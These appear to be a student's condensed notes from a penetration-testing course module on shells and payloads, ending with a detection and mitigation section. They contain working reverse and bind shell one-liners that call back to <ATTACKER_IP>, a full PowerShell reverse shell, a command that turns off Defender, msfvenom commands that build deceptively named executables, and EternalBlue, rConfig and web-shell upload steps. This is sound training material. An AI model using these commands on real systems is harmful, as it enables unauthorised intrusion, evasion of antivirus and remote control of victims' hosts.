# Shells & Payloads

Shell = the prize of exploiting a vuln: interactive access to the OS, system commands, filesystem. From there: enumerate for privesc, pivot, transfer files, persist. CLI shells are quieter than graphical (VNC/RDP), faster to work in, easier to automate. A web shell is the same idea through an uploaded script controlled from the browser. Payload = the command/code that exploits the vulnerability and gets us there.

## Anatomy of a Shell

Terminal emulator ≠ the shell itself — the command language interpreter can be swapped. Identify what you're sitting in:

```bash
ps        # running interpreter (e.g. bash)
env       # SHELL=/bin/bash
```

`$` prompt points to Bash/ksh/POSIX-style shells.

## Bind Shells

Target runs a listener, we connect to its IP:port. Working against it: a listener must already be started on the target (we'd need execution first), edge firewalls/NAT/PAT choke inbound connections, host firewalls block non-trusted inbound. Incoming connection = easier for defenders to catch — reverse shells usually win.

Plain Netcat TCP session first (not a shell, just a pipe):

```bash
nc -lvnp 7777              # target (server)
nc -nv <TARGET_IP> 7777    # attack box (client)
```

Real bind shell — serve bash over the listener, run on target:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> 7777 > /tmp/f
```

```bash
nc -nv <TARGET_IP> 7777    # attack box → target's bash prompt
```

Payloads differ per target OS. This one was delivered manually — real targets need an exploit or delivery trick first.

## Reverse Shells

Our box listens, the target connects out — admins tend to overlook outbound traffic. Bind the listener to a common port (443) so egress filtering doesn't kill the callback; DPI/L7-aware firewalls can still spot it regardless of port.

```bash
sudo nc -lvnp 443          # attack box
```

Netcat is not native to Windows — prefer whatever is native on the target (living off the land). Always ask: what applications and shell languages exist on this host?

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Defender will block this ("script contains malicious content"). Lab workaround from an admin PowerShell:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

The Reverse Shell Cheat Sheet (public repo) has one-liners and generators for most languages — but admins know these repos too, expect to customize.

## Introduction to Payloads

The reverse variant of the bash one-liner:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
```

Anatomy: `mkfifo` creates the named pipe, `cat` feeds it to interactive bash (`-i`), `2>&1` folds stderr into stdout, nc ships everything to our listener, and nc's output redirects back into the pipe.

PowerShell one-liner, condensed: `-nop -c` runs PowerShell with no profile and executes the block; TCPClient dials back, GetStream is the channel; a byte-array buffer loops on Read, `iex` executes whatever arrives locally, results get appended with a `PS <path>>` prompt and written back ASCII-encoded; Close on exit.

Same shell as a Nishang script (Invoke-PowerShellTcp), reverse or bind:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444   # nc/powercat listener must be waiting
Invoke-PowerShellTcp -Bind -Port 4444                               # connect to it with nc/powercat
```

Payload choice follows the target — its OS, shell interpreters, programming languages present. Not everything is a hand-pasted one-liner; frameworks generate and deliver packaged payloads.

## Automating Payloads & Delivery with Metasploit

```bash
sudo msfconsole
```

Module workflow from the module's example (nmap showed SMB on 445):

```
search smb
use exploit/windows/smb/psexec
```

Module name anatomy: `exploit/windows/smb/psexec` = module type / target platform / service / tool uploaded to the target. Search result numbers are relative to that search — don't memorize them.

```
set RHOSTS <TARGET_IP>
set SHARE ADMIN$
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set LHOST <ATTACKER_IP>
exploit
```

Defaults to windows/meterpreter/reverse_tcp. Meterpreter = in-memory DLL injection payload, far more than a raw TCP shell: file up/download, system commands, keylogger, service and process management. `?` lists commands; `shell` drops into a native system shell when Meterpreter's limits get in the way.

The psexec module itself: uses a valid admin username/password (or hash) to execute an arbitrary payload — like SysInternals psexec; cleans up after itself with a random service name/description.

## Crafting Payloads with MSFvenom

`msfvenom -l payloads` lists everything (592 at time of writing). Names lead with the target OS. Staged vs stageless:

- Staged — a small stage executes, then pulls the rest of the payload over the network. Visible in the name: each `/` after the shell part is another stage (`linux/x86/shell/reverse_tcp`, `windows/meterpreter/reverse_tcp`).
- Stageless — whole payload in one shot, name pressed together (`linux/zarch/meterpreter_reverse_tcp`, `windows/meterpreter_reverse_tcp`).
- Stageless is the pick on low-bandwidth/high-latency links (staged sessions can go unstable there) and can help evasion — less traffic.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f elf > createbackup.elf
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

`-p` payload, LHOST/LPORT callback target, `-f` output format, `>` names the file — pick something inconspicuous a user would open. Catch with `sudo nc -lvnp 443`. Delivery ideas: email attachment, download link, chained into an MSF exploit module (needs internal presence), USB on an onsite test. Unencoded/unencrypted exe → near-certain Defender detection.

## Infiltrating Windows

### Prominent Windows Exploits

- **MS08-067** — SMB flaw, trivially exploitable; powered Conficker, used by Stuxnet.
- **EternalBlue (MS17-010)** — SMBv1 RCE from the Shadow Brokers leak; WannaCry/NotPetya; still a common way into vulnerable hosts.
- **PrintNightmare** — Print Spooler RCE; with valid creds or a low-priv shell, install a printer + driver → SYSTEM.
- **BlueKeep (CVE-2019-0708)** — RDP RCE; Windows 2000 through Server 2008 R2.
- **Sigred (CVE-2020-1350)** — DNS SIG record parsing flaw → Domain Admin (the DC usually runs DNS).
- **SeriousSam (CVE-2021-36934)** — non-elevated users can read the SAM database via `C:\Windows\system32\config` and the same perms exist on volume shadow copy backups → credential dump.
- **Zerologon (CVE-2020-1472)** — Netlogon (MS-NRPC) crypto flaw; ~256 guesses at a computer account password, seconds of work → DC takeover.

### Enumerating Windows & Fingerprinting Methods

ICMP TTL of 128 (or 32) = likely Windows:

```bash
ping <TARGET_IP>
sudo nmap -v -O <TARGET_IP>                      # OS detection — read "OS details: Microsoft Windows ..."
sudo nmap -v <TARGET_IP> --script banner.nse     # banner-grab every open port
```

`-O` turning up nothing → retry with `-A -Pn`. Firewalls can skew OS detection — never rely on a single check.

### Bats, DLLs, & MSI Files, Oh My!

Payload file types and what they buy: **DLL** — inject or hijack a vulnerable library → SYSTEM / UAC bypass. **Batch (.bat)** — automated command runs: open a port, call back, enumerate, feed results over the port. **VBS** — phishing vehicle (enable-macro clicks and the like). **MSI** — Windows Installer database, execute via `msiexec` for e.g. an elevated reverse shell. **PowerShell** — .NET-based, the most options for execution and shells.

### Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

Generation: MSFVenom/MSF (swiss-army knife), Payloads All The Things (cheat sheets), Mythic (C2 + unique payloads), Nishang (offensive PowerShell), Darkarmour (obfuscated Windows binaries).

Transfer/execution: Impacket (psexec, smbclient, wmi, Kerberos tools, SMB server), SMB shares — domain hosts often have C$/admin$ usable for payload drop and exfil, MSF exploit modules build+stage+execute automatically, and whatever protocol is open (FTP, TFTP, HTTP/S).

### Example Compromise Walkthrough

1. `nmap -v -A <TARGET_IP>` → Windows Server 2016, IIS 10, SMB. Candidates: IIS, SMB via Impacket/creds, or an OS RCE — MS17-010 spans Server 2008–2016, so validate:

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run
```

→ "Host is likely VULNERABLE to MS17-010"

2. `search eternal` → the author had better luck with the psexec variant:

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
exploit
```

→ "SYSTEM session obtained", Meterpreter opens. `getuid` → NT AUTHORITY\SYSTEM.

3. `shell` → native cmd. Identify it from the prompt: `C:\Windows\system32>` = cmd, `PS ...>` = PowerShell.

### CMD-Prompt and PowerShells for Fun and Profit

Use **cmd** when: the host is old enough to lack PowerShell (pre-Win7), you need simple interaction / batch files / net commands / MS-DOS tools, execution policy or UAC would hinder PowerShell, or stealth matters — cmd keeps no session command history, PowerShell does.

Use **PowerShell** when: cmdlets or custom scripts, .NET object interaction, aliases, cloud services — and stealth is a lesser concern.

### WSL and PowerShell For Linux

WSL traffic to/from the instance isn't parsed by Windows Firewall or Defender — a host blind spot; in-the-wild malware already uses WSL/python3 to fetch payloads, and PowerShell Core on Linux behaves similarly. Both have been seen bypassing AV/EDR.

## Infiltrating Unix/Linux

70%+ of webservers run Unix. Before choosing an attack path, answer: which distro? what shells/programming languages exist? what role does the box serve? what app is it hosting? any known vulns?

### Gaining a Shell Through Attacking a Vulnerable Application

1. `nmap -sC -sV <TARGET_IP>` → 21/22/80/111/443/3306, CentOS + Apache 2.4.6 + PHP 7.2.34 → web server with an app. Browse to it: rConfig (network device config management — owning it likely means owning every device it manages), version 3.9.6 printed on the login page.
2. Search `rConfig 3.9.6 vulnerability`, and `search rconfig` in MSF. Local MSF may just not have the module — search `rConfig 3.9.6 exploit metasploit github`, pull `rconfig_vendors_auth_file_upload_rce.rb`, and drop it into the local modules tree:

```bash
locate exploits   # find the MSF path — Pwnbox: /usr/share/metasploit-framework/modules/exploits
```

Save under `.../exploits/linux/http` with the `.rb` extension (all MSF modules are Ruby). Keep MSF updated (`apt update; apt install metasploit-framework`).

3. Run it:

```
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
exploit
```

Chain it performs: verifies vulnerable version → logs in → uploads PHP payload → triggers it → deletes it → hands over a Meterpreter session. `shell` drops to a non-tty shell running as `apache` (no prompt — apache has no shell defined in its environment).

4. TTY upgrade if Python exists (`which python`):

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Prompt appears (sh-4.2$), and `su`/`sudo` — usually needed for privesc — become usable.

## Spawning Interactive Shells

Any `/bin/sh` below can be swapped for whatever shell binary exists on the box (usually sh or bash). No Python required:

```bash
/bin/sh -i
perl -e 'exec "/bin/sh";'
awk 'BEGIN {system("/bin/sh")}'
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
```

Script-context variants: `perl: exec "/bin/sh";`, `ruby: exec "/bin/sh"`, `lua: os.execute('/bin/sh')` — run from a script, not the command line.

From inside vim:

```text
vim
:set shell=/bin/sh
:shell
```

Then check what the account can do:

```bash
ls -la <path/to/file>
sudo -l    # needs a stable interactive shell — an unstable one may return nothing
```

`sudo -l` showing `(ALL : ALL) NOPASSWD: ALL` is an immediate privesc path.

## Introduction to Web Shells

External perimeters are usually hardened — no exposed SMB. The way in is most often web app attacks (file upload, SQLi, RFI/LFI, command injection), password spraying (RDS, VPN portals, Citrix, OWA — anything AD-authenticated), or social engineering.

Upload vectors to look for: public upload forms accepting PHP/JSP/ASP.NET, self-registration with a profile-picture upload (bypass client-side checks), Tomcat/Axis2/WebLogic WAR deployment, misconfigured FTP that writes into the webroot.

A web shell = browser-based shell on the web server's OS, written in the server's language. Treat it as a foothold only — apps may auto-delete uploads and interactivity is poor. Upgrade to a reverse shell.

## Laudanum, One Webshell to Rule Them All

Ready-made injectable files for asp, aspx, jsp, php and more; ships with Parrot/Kali at `/usr/share/laudanum`. Most files copy as-is; the shells need your IP added first. Read the comments in each file before use.

```bash
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Edit the `allowedIps` variable (line 59) to your attack IP. Strip ASCII art and comments — they're commonly signatured by defenders/AV. Upload via the app's own upload function, note the returned save path, browse to the file, run commands (`systeminfo` etc.).

## Antak Webshell

ASP.NET web shell from the Nishang project — a PowerShell console in the browser. Each command executes as a new process; can run scripts in memory and encode commands. Located at `/usr/share/nishang/Antak-WebShell`.

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

Set the access credentials on line 14 so nobody stumbles into your shell; again, remove ASCII art/comments. Upload → browse → log in → PowerShell. Built-in buttons: submit commands, upload/download files, encode & execute, parse web.config, execute SQL queries. Good launchpad to C2 — upload a payload directly or pull one down with a PowerShell one-liner.

## PHP Web Shells

PHP on the server → PHP web shell is on the table. Manual rConfig 3.9.6 route (default creds admin:admin):

1. Devices > Vendors > Add Vendor — logo upload accepts images only (.png/.jpg/.gif).
2. Proxy the browser through Burp (127.0.0.1:8080), upload WhiteWinterWolf's PHP Web Shell as the "logo", intercept the POST, change `Content-type` from `application/x-php` to `image/gif`, forward.
3. Vendor gets added (torn-paper icon = server didn't recognize it as an image). Browse to:

```text
/images/vendor/connect.php
```

→ non-interactive shell, entirely in the browser.

Considerations: uploads may be auto-deleted after a period, no command chaining (`whoami && hostname` fails), unstable, and easy to leave evidence behind. Preferred pattern: use the web shell to establish a reverse shell, then delete the payload. Document every attempt — payload names, hashes (sha1/MD5), upload locations — for the report.

## Detection & Prevention

ATT&CK mapping for this module: **Initial Access** (public-facing app or misconfigured service → foothold), **Execution** (attacker-supplied code running on the host — everything in this module), **Command & Control** (the channel that follows; blends into standard ports/protocols — HTTP/S, DNS, NTP, even Slack/Discord/Teams).

Events worth alerting on:

- File uploads — check application logs; internet-exposed hosts need hardening + AV + monitoring.
- Non-admin users in shells — who was the last regular user to run `whoami`? End-host→end-host SMB (not end-host→server) is suspicious. Enable user-interaction and PowerShell logging.
- Anomalous NetFlow — top talkers, unique site visits, a heartbeat on a nonstandard port (4444 = Meterpreter default), remote-login and bulk GET/POST spikes.

Netcat sessions are plaintext — anyone capturing traffic reads every command (the module's Wireshark follow shows `net user` account creation in the clear). A DPI-capable appliance acts as AV for the network and can kill the channel.

Endpoint protection: Defender on, firewall on across all profiles (Domain/Private/Public), exceptions only via change management, patch strategy, monitoring/alerting.

Mitigations that actually bite: application sandboxing, least privilege, host hardening + segmentation (STIGs; exposed hosts in a DMZ to stop lateral movement), and firewalls with strict inbound *and* outbound rules — NAT alone can break a shell payload that doesn't account for it.